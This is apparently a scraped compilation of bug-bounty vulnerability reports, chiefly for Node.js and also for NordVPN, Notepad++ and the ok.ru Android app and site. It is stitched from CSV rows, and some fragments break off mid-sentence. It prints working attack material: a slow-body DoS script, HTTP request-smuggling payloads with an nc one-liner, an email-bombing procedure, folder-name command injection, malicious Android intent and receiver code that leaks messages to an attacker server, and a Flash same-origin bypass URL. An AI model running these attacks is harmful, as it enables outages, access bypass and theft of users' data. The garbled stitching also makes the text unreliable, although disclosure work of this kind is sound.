Handling of request bodies is specific to the application code and core Node.js never consumes or parses the request bodies. 
Currently, the body parsing and handling is performed by the following modules:

fastify
restify
busboy, used by fastify-multpart and multer
raw-body, used by body-parser

All of the modules above are vulnerable to the attack.
If part of the body is already sent, the body parsing modules above can be patched to impose a request body sending timeout and therefore mitigate the attack.
The application unfortunately can not completely handle this attack. If the attacker never starts sending the body after completing the submission of the headers, the application code is never invoked. 
Prior to Node.js 13.0.0, the default timeout for a request was 2 minutes, which is a countermeasure against this attack.
Starting with Node.js 13.0.0 instead, the default timeout has been changed to be 0 (which means no timeout) in order to address serverless deployments where long running requests are needed. Since the socket is never considered idle, the application is completely vulnerable to the attack.
While server.headersTimeout is able to detect a slow request, it is only effective if the delay happens during the headers phase (like in Slowloris attacks). If the attacker delays the start of the headers, the start of body sending or sends the body very slow without resulting in an idle socket, the attack is not detected.
In the long run an unprotected server will have a lot of pending requests to handle. At some point it will reach the open connections limit and therefore will not be able to serve additional requests, resulting in a Denial of Service.
Steps To Reproduce:

From one or more attacking sources, open one or more HTTP connections to the target server
For each of the connection in step 1
2.1. (Optional) Wait a certain amount of time before sending the first request header.
2.2 Send all request headers with regular pausing.
2.3 (Optional) Wait a certain amount of time before sending the body data.
2.4. Send the request body with regular pausing.

All the substeps must be performed by sending periodically the smallest amount of data with the highest delay such that the server does not detect an idle socket. For Node 13.0.0 and above there is no idle timeout by default, so the attacker can wait an arbitrary time. For Node.js prior to 13.0.0, at least one byte each 2 minutes must be sent.
We have tested the following test cases:

Connection established, none or partial headers sent then sending is paused: If server.timeout is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.
Connection established, headers sent with long delays: server.headersTimeout is triggered and closes the connection with no response. 
Connection established, headers sent and sending is paused before starting the body: If server.timeout is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.
Connection established, headers sent, body sent with long delays: server.timeout is not able to detect the attack and the server is completely vulnerable to the attack.

What follows is a sample code which reproduces the problem. 
Code 1.06 KiBWrap lines Copy Download1const { createConnection } = require('net')
2
3let start
4let response = ''
5let body = ''.padEnd(4096, '123')
6
7const client = createConnection({ port: parseInt(process.argv[2], 10) }, () => {
8  start = process.hrtime.bigint()
9
10  // Send all the headers quickly so that server.headersTimeout is not triggered
11  client.write('POST / HTTP/1.1\r\n')
12  client.write('Content-Type: text/plain\r\n')
13  client.write(`Content-Length: ${Buffer.byteLength(body)}\r\n`)
14  client.write(`\r\n`)
15
16  // Send the body very slower but in away that the server.timeout is not triggered
17  let i = 0
18  let interval = setInterval(() => {
19    client.write(body[i])
20    i++
21
22    // Done sending, end the request
23    if (i === body.length) {
24      clearInterval(interval)
25      client.write(`\r\n\r\n`)
26    }
27  }, 60000)
28})
29
30client.on('data', data => {
31  response += data
32  client.end()
33})
34
35client.on('close', () => {
36  const duration = Number(process.hrtime.bigint() - start) / 1e9
37
38  console.log(`Receive the following response (${response.length} bytes) in ${duration.toFixed(3)} s:\n\n`)
39  console.log(response)
40})
Once executed, the client will not receive a response before 4096 minutes. If multiple parallel execution of the code above targets the same server, it will result in service denial. 
Impact
This attack has very low complexity and can easily trigger a DDOS on an unprotected server.
Supporting Material/References:
We have written a patch for Node.js (PR 33304) which introduces a new http.Server option called requestTimeout with a default value in milliseconds of 120000 (2 minutes).
When requestTimeout is a positive value, the server will start a new timer set to expire in requestTimeout milliseconds when a new connection is established. The timer is also set again if new requests after the first are received on the socket (this handles pipelining and keep-alive cases).
The timer is cancelled in the following case:

When the request body is completely received by the server.
When the response is completed. This handles the case where the application responds to the client without consuming the request body.
When the connection is upgraded, like in the WebSocket case.

If the timer expires, then the server responds with status code 408 and closes the connection. This prevents the DOS attack.

The llhttp parser in the httpmodule in Node 16.3.0 accepts requests with a space (SP) right after the header name before the colon. This can lead to HTTP Request Smuggling (HRS).
Description:
When Node receives the following request:
Code 61 BytesWrap lines Copy Download1GET / HTTP/1.1
2Host: localhost:5000
3Content-Length : 5
4
5hello
It interprets the request as having the body hello. Here is the relevant section of the code: https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L410-L415
How could this lead to HRS? Imagine that Node is placed behind a proxy which ignores the CL header with a space before the colon, but forwards it as is. Then the following attack can be performed:
Code 123 BytesWrap lines Copy Download1GET / HTTP/1.1
2Host: localhost:5000
3Content-Length : 23
4
5GET / HTTP/1.1
6Dummy: GET /smuggled HTTP/1.1
7Host: localhost:5000
8
The proxy would see the first and the second GET-request. But Node would see the first and the third GET-request.
Steps To Reproduce:
We don't know of any proxy that behaves this way, but here is how to show that Node is behaving in the described way. Run the following code like this: node app.js
Code 568 BytesWrap lines Copy Download1const http = require('http');
2
3// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/
4
5http.createServer((request, response) => {
6  let body = [];
7  request.on('error', (err) => {
8    response.end(""error while reading body: "" + err)
9}).on('data', (chunk) => {
10    body.push(chunk);
11}).on('end', () => {
12    body = Buffer.concat(body).toString();
13
14    response.on('error', (err) => {
15        response.end(""error while sending response: "" + err)
16    });
17
18    response.end(""Body length: "" + body.length.toString() + "" Body: "" + body);
19  });
20}).listen(5000);
Then send a request with a space between the CL header and the colon. This can be done with the following one-liner:
Code 104 BytesWrap lines Copy Download1echo -en ""GET / HTTP/1.1\r\nHost: localhost:5000\r\nContent-Length : 5\r\n\r\nhello"" | nc localhost 5000
See that Node interpreted the body as hello.

According to the HTTP-spec, http values are

We are trying to address an issue with Envoy, where if

As said above, this could allow privileged escalation, where if one uses an http_parser  enabled server configured to block specific domains, those blocks can be trivially bypassed using white-space.

Summary: [add summary of the vulnerability]
Apparently, node.js converts CR in HTTP request headers to hyphen before parsing. This can lead to HTTP Request Smuggling as it is a non-standard interpretation of the header.
Description: [add more details about this vulnerability]
Consider an HTTP request with Content[CR]Length header . Suppose a proxy in front of node.js ignores the Content[CR]Length header (and therefore assumes a 0-length body). node, on the other hand, converts the CR to a hyphen and uses the value of the (newly formed...) Content-Length header. HTTP Request Smuggling ensues.
Steps To Reproduce:
This is the HTTP stream that demonstrates the vulnerability:
GET / HTTP/1.1
Host: www.example.com
Content[CR]Length: 42
Connection: Keep-Alive
GET /proxy_sees_this HTTP/1.1
Something: GET /node_sees_this HTTP/1.1
Host: www.example.com
A proxy server that ignores the invalid Content[CR]Length header will assume that the body length is 0 (since there's no body length indication), and will thus transmit the stream up to (but not including) the GET /proxy_sees_this. It will wait for node to respond (which interestingly does happen, even though node.js does expect the body - perhaps on GET requests, the URL is invoked regardless of the body?), then the proxy forwards the second request (from its perspective) - the GET /proxy_sees_this. Node then silently discards the expected 42 bytes of the body of the first request, and thus starts parsing the 2nd request from GET /node_sees_this.
HTTP Request Smuggling ensues.

Node.js,11-50,0.0,1m-10m,$250.00,Medium,5.45,HTTP Request Smuggling,HTTP Request Smuggling due to ignoring chunk extensions,"mkg  submitted a report to Node.js.Jun 19th (about 1 year ago)Summary:
The llhttp parser in the http module in Node 16.3.0 ignores chunk extensions when parsing the body of chunked requests. This leads to HTTP Request Smuggling (HRS) when a Node server is put behind an Apache Traffic Server (ATS) 9.0.0 proxy.
Description:
In the chunked transfer encoding format there can be a so called chunk extension after each chunk size. Example:
Code 75 BytesWrap lines Copy Download1GET / HTTP/1.1
2Host: localhost
3Transfer-Encoding: chunked
4
55 ; a=b
6hello
70
8
In the example above the chunk extension would be ; a=b. You can read more here https://datatracker.ietf.org/doc/html/rfc7230#section-4.1.1 and here https://www.rfc-editor.org/errata/eid4667 .
llhttp doesn't try to parse the chunk extension properly, but simply ignores every byte until it reaches a \r (source: https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L736-L739). By following the ABNF of chunk extensions one can see that the only allowed bytes in this area are 0x09, 0x21-0x7e and 0x80-0xff. But llhttp allows any byte. This is the bug.
Notably we can put a \n in this area. This allows us to perform HRS when combined with ATS. This is because ATS also incorrectly parses the chunked extension. ATS looks for the first \n character and doesn't verify whether it was preceded by a \r. We arrive at the following attack:
Code 148 BytesWrap lines Copy Download1GET / HTTP/1.1
2Host: localhost:8080
3Transfer-Encoding: chunked
4
52 \nxx
64c
70
8
9GET /admin HTTP/1.1
10Host: localhost:8080
11Transfer-Encoding: chunked
12
130
14
By sending the data above when ATS is a proxy in front of Node, ATS will see one request to / and Node will see two requests, one to / and one to /admin. Note that all lines are terminated by CRLF (\r\n) and that \n should be replaced with an LF character.
Usually with HRS it is possible to smuggle a request past a proxy directly to the server and then get a response for the smuggled request back to the attacker. But due to a bug in ATS where the connection hangs after a chunked request is sent, we can in this case only send a smuggled request and not see the response. But we have full control over the headers and body of the smuggled request.
Both these bugs have been reported to ATS and have not been fixed yet.
Steps To Reproduce:
This Proof of Concept requires docker and docker-compose.
Unzip the attached poc.zip. Start the systems with sudo docker-compose up --build. Now Node can be accessed directly at http://localhost:8081 and ATS (forwarding to Node) can be accessed at http://localhost:8080
Node behaves like this:
Code 124 BytesWrap lines Copy Download1$ curl http://localhost:8081
2INDEX
3$ curl http://localhost:8081/admin
4ADMIN
5$ curl http://localhost:8081/forbidden
6FORBIDDEN
Note that when /admin is requested, then /admin was reached! is printed in the docker-compose terminal.
ATS behaves like this:
Code 128 BytesWrap lines Copy Download1$ curl http://localhost:8080
2INDEX
3$ curl http://localhost:8080/admin
4FORBIDDEN
5$ curl http://localhost:8080/forbidden
6FORBIDDEN
Note that all requests to /admin are rerouted to /forbidden by ATS. So the /admin endpoint can't be reached.
Now it's time to send the attack described above. This can be done by using the included payload.py. The attack can be sent using the following command:
Code 38 BytesWrap lines Copy Download1python3 payload.py | nc localhost 8080
When the attack is sent, we see /admin was reached! being printed in the terminal. So we bypassed the proxy and reached /admin.
(As mentioned before, due to a bug in ATS, the response to the smuggled request can't be seen. If ATS would not have had the mentioned bug, then payload2.py could have been used to both send a request and see the response.)
Impact
If the proxy is acting as an access control system, only allowing certain requests to come through, it can be bypassed, allowing any request to be sent.1 attachment:F1344561: poc.zip",https://hackerone.com/reports/1238099,California,United States,San Francisco,2021,6,19,8,43

Summary: A reachable assert in the NodeJS HTTP/2 implementation can result in a denial of service. 
Description: Attackers can send a series of malformed HTTP/2 SETTINGS frames to reach an assertion in code, causing the node process to exit with SIGABRT. This has been observed in v13.8.0 and v14.0.0-nightly20200213e23b12e130.

2) Create an example client to send the attached cases in a loop. In this case, I used an internal fuzz testing tool that I unfortunately cannot share but I can attach the test cases which I sent. We discovered that by sending a malformed SETTINGS frame over and over (roughly 25 in a row) the node process will SIGABRT. 
3) Observe node process crash after series of requests are sent. I can consistently trigger this issue in 13.8.0 and 14.0.0. I will provide a stack trace, stack trace when run under valgrind, and the test case I used to reproduce the issue. If the core file is needed I can provide that as well.
I believe this is where the assertion is triggered.

I believe this to be a ""High"" severity issue with this CVSS score - https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H5 attachments:F722191: 1_connection_preface_frameF722192: 2_headers_frameF722193: 3_server_settings_ack_frameF722195: 4_settings_anomalyF722197: SETTINGS_FRAME_DETAILS.png",https://hackerone.com/reports/800140,California,United States,San Francisco,2020,2,20,0,15
Node.js,11-50,0.0,1m-10m,$250.00,High,8.5,Memory Corruption - Generic,napi_get_value_string_X allow various kinds of memory corruption,"tniessen  submitted a report to Node.js.Jan 27th (3 years ago)Summary:
napi_get_value_string_latin1, napi_get_value_string_utf8, napi_get_value_string_utf16 are vulnerable to buffer overflows, partially due to an integer underflow.
Description:
napi_get_value_string_latin1, napi_get_value_string_utf8, and napi_get_value_string_utf16 behave like this:

If the output pointer is NULL, return.
Write min(string_length, bufsize - 1) bytes to the output buffer. Note that bufsize is an unsigned type, so this leads to an integer underflow for bufsize == 0. Since this is a size_t, the underflow will cause the entire string to be written to memory, no matter how long the string is.
Finally, write to buf[copied], where copied is the number of bytes previously written. Even if step 2 hadn't written out of bounds, this would (for bufsize == 0).

Steps To Reproduce:
Code 230 BytesWrap lines Copy Download1Napi::Value Test(const Napi::CallbackInfo& info) {
2  char buf[1];
3  // This should be a valid call, e.g., due to a malloc(0).
4  napi_get_value_string_latin1(info.Env(), info[0], buf, 0, nullptr);
5  return info.Env().Undefined();
6}
Code 128 BytesWrap lines Copy Download1const binding = require('bindings')('validation');
2console.log(binding.test('this could be code that might later be executed'));
Running the above script corrupts the call stack:
Code 120 BytesWrap lines Copy Download1tniessen@local-vm:~/validation-fails$ node .
2*** stack smashing detected ***: <unknown> terminated
3Aborted (core dumped)
The best outcome is a crash, but a very likely outcome is data corruption. If the attacker can control the string's contents, they can even insert code into the process heap, or modify the call stack. Depending on the architecture and application, this can lead to various issues, up to remote code execution.
It is perfectly valid to pass in a non-NULL pointer for buf while specifying bufsize == 0. For example, malloc(0) is not guaranteed to return NULL.  A npm package might correctly work on one machine based on the assumption that malloc(0) == NULL, but might create severe security issues on a different host. Passing a non-NULL pointer is also not ruled out by the documentation of N-API, so it is not valid to assume that buf will always be NULL if bufsize == 0.
Impact
npm packages and other applications that use N-API may involuntarily open up severe security issues, that might even be exploitable remotely. Even if buf is a valid pointer, passing bufsize == 0 allows to write outside of the boundaries of that buffer.
Step 2 of the description allows an attacker to precisely define what is written to memory by passing in a custom string. Depending on whether the pointer points to heap or stack, possible results include data corruption, crashes (and thus DoS), and possibly even remote code execution, either by writing instructions to heap memory or by corrupting the stack.
Many attacks are likely caught by kernel and hardware protection mechanisms, but that depends on the specific hardware, kernel, and application, and memory layout. Even if they are caught, the entire process will crash (which is still good compared to other outcomes).",https://hackerone.com/reports/784186,California,United States,San Francisco,2020,1,27,16,49
Node.js,11-50,0.0,1m-10m,$250.00,Medium,6.5,Buffer Over-read,OOB read in libuv,"ericsesterhenn  submitted a report to Node.js.May 26th (about 1 year ago)Summary: 
The pointer p is read and increased without checking whether it is beyond pe, with the latter holding a pointer to the end of the buffer. This can lead to information disclosures or crashes. This function can be triggered via uv_getaddrinfo().  nodejs seems to use libuv and is possibly affected by this as well.
Description:
An out-of-bound read can occur when uv__idna_toascii() is used to convert strings to ASCII. The pointer p is read and increased without checking whether it is beyond pe, with the latter holding a pointer to the end of the buffer. This can lead to information disclosures or crashes. This function can be triggered via uv_getaddrinfo().  nodejs seems to use libuv and is possibly affected by this as well.
Steps To Reproduce:
i attached a testcase and the ad-hoc fuzzer I used to identify the issues. If you need further help reproducing, please let me know.

Misc
This issue was found during an audit of Cure53 for ExpressVPN but ExpressVPN is not affected by the issue. I reported it to the libuv project, whose maintainers suggested that i report it to nodejs directly as well.
Impact
An oob read that does not seem to be abused to leak data, but possibly read to a guarded page which segfaults the process.3 attachments:F1315537: desc.txtF1315538: fuzz.tar.bz2F1315539: testcase_oob_read",https://hackerone.com/reports/1209681,California,United States,San Francisco,2021,5,26,6,22
Node.js,11-50,0.0,1m-10m,$250.00,Critical,9.3,Improper Certificate Validation,Remotely trigger an assertion on a TLS server with a malformed certificate string,"rogierschouten  submitted a report to Node.js.Nov 26th (3 years ago)Summary:
Connecting to a NodeJS TLS server with a client certificate that has a type 19 string in its subjectAltName will crash the TLS server if it tries to read the peer certificate.
Affected versions include v10.17.0 and v13.1.0.
This is related to issue https://github.com/nodejs/node/issues/30521 but it works the other way around: in that issue, the client crashes; in this example, the server crashes. 
It is likely that the fix for that issue will also fix this.
Description:
Using e.g. node-forge it is possible to create certificates without common name and with any subjectAltName content.  Hence anybody can create a malformed certificate and send it to a node server. The server will encounter an assertion in node_crypto.cc
Steps To Reproduce:

Store all files below  (under supporting material) in the same directory
Start node ./server.js
Start node ./client.js
Result: assertion error in the server

Impact:
Anybody can remotely connect to a TLS server and supply an invalid certificate, causing the server to crash, hence this is a denial-of-service possibility.

denial of service - remotely crashing a server",https://hackerone.com/reports/746733,California,United States,San Francisco,2019,11,26,16,10
Node.js,11-50,0.0,1m-10m,$250.00,Low,2.0,Denial of Service,"Slowloris, body parsing","underflow0  submitted a report to Node.js.Feb 18th (3 years ago)Summary: [add summary of the vulnerability]
Attackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open by maintaining activity, and use resources over an extended period.
Description: [add more details about this vulnerability]
Body data is sent one byte at a time, slowly, in a HTTP request. The connection stays open, hogging resources. There is no builtin feature that can make this trigger a timeout, as long as the bytes are sent at an interval lower than the server.timeout value if it is set. May not technically be a Node.js bug since it doesn't handle parsing of the body, but the typically body parsing library (e.g. https://www.npmjs.com/package/body-parser) does not implement any feature to mitigate the vulnerability.
Steps To Reproduce:
(Add details for how we can reproduce the issue)

Start a HTTP server and set the server timeout to 2 seconds.
Add a library that parses the request body.
Open a connection to the server.
Send a HTTP header.
Send the body, 1 byte per second.

Impact: [add why this issue matters]

Node.js,11-50,0.0,1m-10m,$250.00,Medium,6.7,Privilege Escalation,Node Installer Local Privilege Escalation ,"deepsurface-robert  submitted a report to Node.js.May 28th (about 1 year ago)Node is vulnerable to local privilege escalation attacks under certain conditions on Windows platforms. More specifically, improper configuration of permissions in the installation directory allows an attacker to perform two different escalation attacks: PATH and DLL hijacking.  
To demonstrate this flaw, we first download the latest version of Node from https://nodejs.org/en/download/. At the time of writing, this was node version 14.17.0. 
We follow the standard installation steps, except for the installation directory, which we change to C:\tools. This directory can either be created through the installer GUI, or through mkdir C:\tools. 
Image F1318095: image1.png 16.45 KiBZoom in Zoom out Copy Download
We also select the option in a later step to “automatically install the necessary tools”. 
In the screenshot below, note the improper permissions, BUILTIN\Users Allow *, on the installation directory, which are inherited from the drive root. This gives any local user the ability to create arbitrary files in the installation directory. 
Image F1318096: image4.png 32.53 KiBZoom in Zoom out Copy Download
This unprotected directory has also been added to the system PATH variable, allowing an attacker to drop malicious executables in that directory and have them executed by other users in certain circumstances. (Note that you may have to start a new powershell instance to see the PATH change.)
Image F1318097: image5.png 47.69 KiBZoom in Zoom out Copy Download
To fully demonstrate the implications of this vulnerability, first create a new unprivileged user. Then, as this user, drop a malicious exe into the C:\tools directory and rename it to npm.exe. For testing purposes, you can simply do cp node.exe npm.exe. Note that the same could be done for npx. 
Windows will search for a program with the .exe extension first, meaning that the malicious npm.exe will take precedence over npm.cmd. 
Now, as the privileged user, try running npm. This should drop you into the node shell, demonstrating how an attacker could run a malicious executable. 
Image F1318098: image2.png 12.51 KiBZoom in Zoom out Copy Download
A writable PATH directory would also allow an attacker to hijack the execution of any commands that come later in the path. From the default node installation, this would include chocolatey, a software management tool for Windows. However, such a vulnerability could also affect all programs installed in the future as well. 
Aside from the PATH vulnerability, the insecure permissions configured could also allow an attacker to perform a DLL hijacking attack against the node.exe. Using Process Monitor, we can confirm that node attempts to load a number of DLLs from the unprotected folder.

For more information on DLL hijacking attacks, see our blog post. 
It is worth noting that a very similar problem was discovered in RabbitMQ and reported by the DeepSurface Security research team. The RabbitMQ team fixed this issue in May 2021. For more information, see: CVE-2021-22117.

Node.js,11-50,0.0,1m-10m,$250.00,High,7.95,Man-in-the-Middle,Node.js: TLS session reuse can lead to hostname verification bypass,"fwilhelm  submitted a report to Node.js.Mar 5th (3 years ago)The Node.js TLS library supports client side reuse of TLS sessions when multiple connections to the same server are opened.
Code that wants to use this feature can listen for the 'session' event (https://nodejs.org/api/tls.html#tls_event_session) on a tls.TLSSocket to get notified of newly created TLS sessions. The documentation for this event explicitly mentions that the passed sessions ""can be used immediately or later"".
The problem with this design is that 'session' events are triggered even if verification of the server certificate hostname in onConnectSecure fails. (https://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/_tls_wrap.js#L1502):
onConnectSecure is triggered by the OpenSSL info callback (with the flag SSL_CB_HANDSHAKE_DONE) after a TLS handshake. The 'session' event is triggered by OpenSSLs get_session_cb, which can happen before the info callback in TLS 1.2 and after in TLS 1.3 and which is triggered regardless of the result of onConnectSecure.
This means that sessions where the server presented an invalid certificate, or one with a wrong hostname, will trigger the session event and can end up being reused or stored in a cache.
That behavior is insecure, because resumed sessions will not be subjected to another hostname verification check as long as they are CA signed:
// Verify that server's identity matches it's certificate's names
// Unless server has resumed our existing session
if (!verifyError && !this.isSessionReused()) {
const hostname = options.servername ||
options.host ||
(options.socket && options.socket._host) ||
'localhost';
const cert = this.getPeerCertificate(true);
verifyError = options.checkServerIdentity(hostname, cert);
}
In practice, this means that the immediate reuse described in the API documentation is always insecure and that session caches are at risk of storing insecure sessions. The most important implementation of a session cache is in the https library (https://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/https.js#L130): New sessions are stored in the cache when the ‘session’ event is triggered and are evicted once a tls socket is closed with an error. 
 if (options._agentKey) {
// Cache new session for reuse
socket.on('session', (session) => {
this._cacheSession(options._agentKey, session);
});
    // Evict session on error
socket.once('close', (err) => {
if (err)
this._evictSession(options._agentKey);
});
}
This opens a small race window where an invalid session can be used by other HTTPs requests to the same host. The attached proof-of-concept wins the race reliably against a local server using a setImmediate() callback, but there are probably other ways this could be exploited in real world applications. I also did not fully investigate if there is a way to trigger the socket ‘close’ event with no error which would skip the session eviction and turn this into a 100% reliable bypass.
The POC requires a target server with a valid CA signed certificate (for an arbitrary hostname) and support for TLS resumption. I’ve attached a minimal golang https server that worked for me.

Nord Security,1001-5000,0.0,No value,$500.00,Medium,5.3,Improper Authentication - Generic,No Rate Limit On Forgot Password Page Of NordVPN,"th3pr0xyb0y  submitted a report to Nord Security.Dec 4th (3 years ago)Introduction
A little bit about Rate Limit:
A rate limiting algorithm is used to check if the user session (or IP-address) has to be limited based on the information in the session cache.
In case a client made too many requests within a given timeframe, HTTP-Servers can respond with status code 429: Too Many Requests.
## Description:-
I have identified that when Forgetting Password for account , the request has no rate limit which then can be used to  loop  through one request. Which can be annoying to the root users sending mass password to one email.
Steps To Reproduce The Issue
Step 1-Go To This Link https://ucp.nordvpn.com/lost-password
Enter Email  Click On Forget Password 
Step 2- Intercept This Request In Burp And Forward Till You Found Your Number In Request Like {""email"":""your email here""}

Step 3- Now Send This Request To Intruder And Repeat It 100 Time By Fixing Any Arbitrary Payload Which Doesn't No Effect Request I Choose Accept-Language: en-US,en;q=0.$5$
Step 4 - See You Will Get 200 ok Status Code & 100 + Email In Your INBOX
See It Is Resulting In Mass Mailing Or Email Bombing To Your Users Which Is Bad For Business Impact
Solution -
I Will Recommend You To Add A ReCaptcha & Sort Of Something Which Requires Manual Human Interaction To Proceed Like You Can Add Captcha Like 2+2=___ so that it cannot be brute forced and you also can have a limit at the backend for particular number upto 5 times a day user can request Forget Password Email or Link something like that will prevent you from someone exploiting this vulnerability

Path : C:\Program Files (x86)\Notepad++\notepad++.exe
Admin mode : ON

\"" have been introduced with commit 0f93670 to prevent RCE.
However it is still possible to inject arbitrary commands using environment variables. For example trying to open a folder named %TEST% will result in the expansion of the environment variable, if it contains a "" then its possible to inject arbitrary commands after that "" in the directory name.
Steps To Reproduce:

Create a new environment variable (or a temporary one), let's name it TEST and set its value: ""
Create a new folder named %TEST%  && mkdir boom and create a text file in it, let's name that file test.txt
Open test.txt with Notepad++ and click on File->Open Containing Folder->cmd
The command in the folder name gets executed and the boom folder is created

Fix:
Escape %characters before executing the command: % -> ^%.

ok.ru,501-1000,0.0,100m-200m,$250.00,No value,0.0,None,Multiple critical vulnerabilities in Odnoklassniki Android application,"hardc0re  submitted a report to ok.ru.Nov 2nd (7 years ago)Hello,
I have recently found several critical vulnerabilities in Odnoklassniki Android application, which is one of your projects, thus I am reporting it here.
The first vulnerability is so called Intent spoofing.
The vulnerability lies in ability to start the video upload activity of Odnoklassniki application from inside a different application installed on the same device. This vulnerability happens when a component is made public and requires no special permission. A consequence of this may be that a malicious app sends an intent to a legitimate component (VideoUploadActivity), which will result in data injection or state change (in our case a user might be tricked into uploading content he normally would not upload to ok.ru network).
The following code snippet demonstrates possible exploit code:
Intent m = new Intent();
m.setClassName(""ru.ok.android"",""ru.ok.android.ui.activity.StartVideoUploadActivity"");
startActivity(m);
Staying with the intent spoofing vulnerability, there is one more case of this kind of vulnerability.
This time a malicious application is able to send fake Notifications to user about literally any happening or action in Odnoklassniki. User can be tricked this way to do action he did not intend to again. A malicious app might send fake private messages to the victim user, impersonating other users! The user can be misinformed about a comment on his photo or a response in any of groups he belongs to! The origin of this vulnerability is just as the former one, action is made public in the application and it does not require the calling application to have any kind of permission to do so.
This vulnerability originates from class ok.ru.android.services.app.NotifyReceiver
Possible fix to this? Explicitly set the value of android:exported to false or make use of permissions.
A short code snippet demonstrating possible exploitation:
Intent u = new Intent();
u.setAction(""ru.ok.android.action.NOTIFY"");
u.putExtra(""key"", ""d-147298617"");
u.putExtra(""message"", ""Hello there! This is a fake message. You have been tricked."");
//u.putExtra(""conversation_id"", """");
//u.putExtra(""mediatopic_id"", ""413434225584"");
u.putExtra(""dsc_id"", ""612470493988:USER_PHOTO"");
getActivity().sendBroadcast(u);
Another vulnerability that I have found is Unauthorized intent receipt, in this certain case it is unauthorized notification (message) receipt. Knowing this vulnerability a potential attacking application is able to intercept private messages, updates, photo comments, post comments, etc. sent to the user. The cause of this vulnerability lies in AndroidManifest.xml. The receipt of a notification (message) should be protected from intercepting with proper permission requirement. Possible mitigation - Do not use implicit intents for communication between the components of a single app or require the target application to have a proper permission acquired.
Here I am enclosing a complete malicious receiver code snippet, which is able to intercept all ""messages"" shown to the user as a notification. Please note, that the malicious application is able to see not only the message but the userId of the user who sent it and many other sensitive details.
public class MaliciousReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
if (""ru.ok.android.action.NOTIFY"".equals(intent.getAction())) {
        Bundle localBundle = intent.getExtras();
if (localBundle != null) {
String str1 = localBundle.getString(""key"");
String str2 = localBundle.getString(""message"");
String str3 = localBundle.getString(""cid"");
if (str3 != null) {
String str4 = localBundle.getString(""caller_name"");
String str5 = localBundle.getString(""server"");
return;
}
            String str4 = localBundle.getString(""nconversation_id"");
String str5 = localBundle.getString(""dsc_id"");
            Toast.makeText(context, ""key:"" + str1 + ""\nmessage: "" + str2 + ""\ncid: "" + str3 + ""\nconversation_id: "" + str4 + ""\ndsc_id: "" + str5, Toast.LENGTH_SHORT).show();
}
}
}
}
And here comes the most serious issue. The vulnerabilities explained above affected the data and user privacy in scope of your application ""only"". This vulnerability, on the other side, violates the whole android security mechanism. The vulnerability is known as ""Privilege redelegation"". It happens when your application is used as a mediator to help other (malicious) applications to circumvent android permission system.
This vulnerability lies in class ru.ok.android.videochat.VideochatController.java .
The permission which is mediated to 3rd party applications here is the INTERNET persmission, which is truly the most dangerous permission out there.
When we analyze the following line of code:
localHttpMethod = new RestApiMethodBuilder(localServiceStateHolder, HttpMethodType.GET).setTargetUrl(new URI(""http://"" + this.server + ""/"", false)).addRelativePath(""api-get-signal"", true).addSignedParam(""uid"", localServiceStateHolder.getUserId(), false).addSignedParam(""cid"", str1, false).addSignedParam(""client"", Constants.Api.CLIENT_NAME, false).build();
we can clearly notice that there's a variable (this.server) passed directly to the method construction.
As you can imagine, I am able to pass the address of my own server to this variable through an Intent.
This will result in Odnoklassniki application sending an HTTP request to my server with all the data contained!
We cannot alter the data contained within the request, but that does not stop us.
Once any 3rd party application is able to send a HTTP request to arbitrary server in the world just with a single Intent, without even the need to have the INTERNET permission acquired itself, it obviously violates the android security permission principle.
The code demonstration would require longer piece of code, thus I will try to explain possible exploit scenario verbally.
As we can perform a single HTTP request with a single Intent sent to ok.ru application, we can do this more times in row without an issue! Data does not need to be transfered from the device using a text, we could use a morse code for example. We could send the Intents within specific time intervals and delays, which would reflect in arbitrary information being leaked from the device to an arbitrary server. The morse code processing in our means would be processed at the server side of course.
The mediated HTTP request from a 3rd party application may be achieved using a code like this:
Intent m = new Intent();
m.setAction(""ru.ok.android.action.NOTIFY"");
m.putExtra(""key"", ""vchat"");
m.putExtra(""cid"", ""c60b0e06695a4ce896261247b43f772b"");
m.putExtra(""caller_name"", ""Fake User"");
m.putExtra(""server"", ""myserver.com:1234"");
getActivity().sendBroadcast(m);
I hope I have explained each of the vulnerabilities clearly enough so that you can patch them with ease.
If something is not clear enough, please feel free to ask more details. I can provide some PoC with pictures in case of need too.
I am also enclosing a PoC of the privilege redelegation vulnerability.
In the picture there is the HTTP request that is sent by my demo malicious (exploit) application through the ok.ru application to my server.
I am looking forward to hearing from you soon.

This is really similar issue to my previous report #102234 - exploitation mechanism is really same but other swf file is vulnerable. All conditions are met: 

st.mycdn.me domain which is in ok.ru crossdomain.xml
Security.allowDomain('*')

I've just found a way to bypass Same-Origin Policy mechanism using vulnerability in one of swf files on your cdn. Let me explain this in details:


First of all - your Crossdomain which defines from what domains Flash files can read content on ok.ru. Crossdomain file is located here - http://ok.ru/crossdomain.xml


We need to find some vulnerable swf file on any of domains listed in crossdomain file.


I've found this shiny beauty: http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf 


Flashbang Tool recognized that there are two parameters needed - ""vpaidSwfUrl"" and ""Loader""


Decompilation of swf shows that Security.allowDomain(""*"") is used - so we can interact with this Flash file from any domain. 


vpaidSwfUrl is not controlled at all, and it loads and executes any external SWF. So we can use our malicious one to prepare attack. 


Our loaded and executed SWF from st.mycdn.me domain will make request to http://ok.ru/settings , read its content and send to javascript function in attacker controled origin. 


Profit - attacker gained information, whitout any user interaction. Now he can steal such sensitive data as user's e-mail, csrf tokens, private messages, and so on.


Vulnerable file that loads content from ok.ru (can be viewed in browser Developer's console): http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf?vpaidSwfUrl=http://ropchain.org/poc/ok.swf?url=http://ok.ru/settings&Loader=test
Proof of Concept that loads http://ok.ru/settings page and put it as innerHTML of div element of domain that I control (ropchain.org): http://ropchain.org/poc/ok.html
